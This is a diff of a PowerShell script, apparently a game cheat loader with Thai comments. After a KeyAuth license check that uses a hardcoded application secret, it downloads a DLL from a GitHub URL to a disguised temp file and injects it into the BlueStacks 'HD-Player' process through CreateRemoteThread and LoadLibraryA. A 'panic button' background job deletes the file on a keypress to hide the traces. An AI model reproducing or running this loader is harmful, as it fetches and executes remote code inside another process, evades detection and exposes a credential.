@@ -1,6 +1,6 @@
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
-# --- Config KeyAuth ---
+# --- ข้อมูล KeyAuth ---
 $Name    = "Relaxwtf777's Application"
 $OwnerID = "W404AorT6U"
 $Secret  = "bdd0ab6c75599fffdb5ad43d22a82fe8bf8fa0fbd92dfdfbb2df80dc6d105d38"
@@ -25,19 +25,18 @@ function Show-Auth {
     
     try {
         $loginRes = Invoke-RestMethod -Uri $loginUrl -Method Get
-        if ($loginRes.success -eq $true) { return $true } else { return $false }
+        return $loginRes.success -eq $true
     } catch { return $false }
 }
 
 if (Show-Auth) {
     $dllUrl = "https://raw.githubusercontent.com/relaxhaha56-maker/node-storage-33/refs/heads/main/winsky.dll"
     $tempPath = "$env:TEMP\sys_node_cache.dll"
-    $targetProcesses = @("HD-Player", "BlueStacks", "MSIPlayer")
+    $targetProc = "HD-Player" # กลับมาใช้ชื่อตัวเดียวเพื่อความชัวร์
 
-    Write-Host "[*] Downloading Data..." -ForegroundColor Yellow
+    Write-Host "[*] Syncing data..." -ForegroundColor Yellow
     try {
-        $wc = New-Object System.Net.WebClient
-        $wc.DownloadFile($dllUrl, $tempPath)
+        (New-Object System.Net.WebClient).DownloadFile($dllUrl, $tempPath)
     } catch { exit }
 
     $Source = @"
@@ -56,40 +55,40 @@ if (Show-Auth) {
         public static void StartNode(string path, string pName) {
             Process[] target = Process.GetProcessesByName(pName);
             if (target.Length == 0) return;
-            foreach (var p in target) {
-                IntPtr hProc = OpenProcess(0x001F0FFF, false, p.Id);
-                if (hProc == IntPtr.Zero) continue;
-                IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)path.Length + 1, 0x3000, 0x40);
-                IntPtr outSize;
-                WriteProcessMemory(hProc, addr, Encoding.Default.GetBytes(path), (uint)path.Length + 1, out outSize);
-                IntPtr loadLib = GetProcAddress(GetProcAddress(GetModuleHandle("kernel32.dll"), "GetModuleHandleA") == IntPtr.Zero ? GetModuleHandle("kernel32.dll") : GetModuleHandle("kernel32.dll"), "LoadLibraryA");
-                CreateRemoteThread(hProc, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
-            }
+            IntPtr hProc = OpenProcess(0x001F0FFF, false, target[0].Id);
+            IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)path.Length + 1, 0x3000, 0x40);
+            IntPtr outSize;
+            WriteProcessMemory(hProc, addr, Encoding.Default.GetBytes(path), (uint)path.Length + 1, out outSize);
+            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+            CreateRemoteThread(hProc, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
         }
     }
 "@
     Add-Type -TypeDefinition $Source
 
+    # 1. ฉีดแค่ครั้งเดียวตอนเริ่ม (ตามที่คุณต้องการ)
+    [NodeHandler]::StartNode($tempPath, $targetProc)
+    Write-Host "[+] DLL Injected successfully." -ForegroundColor Green
+
+    # 2. เริ่ม Job เบื้องหลังเพื่อ "ดักปุ่ม Home" อย่างเดียว
     $ScriptBlock = {
-        param($path, $targets)
+        param($path)
         Add-Type -AssemblyName PresentationCore
         while ($true) {
-            foreach ($name in $targets) {
-                [NodeHandler]::StartNode($path, $name)
-            }
             if ([Windows.Input.Keyboard]::IsKeyDown([Windows.Input.Key]::Home)) {
+                # ลบไฟล์ DLL ทิ้งทันทีเมื่อกด Home
                 Remove-Item $path -Force -ErrorAction SilentlyContinue
                 break
             }
             Start-Sleep -Seconds 1
         }
     }
+    Start-Job -ScriptBlock $ScriptBlock -ArgumentList $tempPath -Name "BasX_Panic_Button"
 
-    Start-Job -ScriptBlock $ScriptBlock -ArgumentList $tempPath, $targetProcesses -Name "BasX_Job"
-    
-    Write-Host "[+] BasX System: Active" -ForegroundColor Green
-    Write-Host "[!] Press 'HOME' to Clean." -ForegroundColor Red
+    Write-Host "[!] Ready! You can close this window." -ForegroundColor Cyan
+    Write-Host "[!] Press 'HOME' key anytime to Clean & Stop." -ForegroundColor Red
     Start-Sleep -Seconds 3
 } else {
-    Write-Host "[-] Auth Failed." -ForegroundColor Red
+    Write-Host "[-] Login Failed." -ForegroundColor Red
+    Start-Sleep -Seconds 5
 }
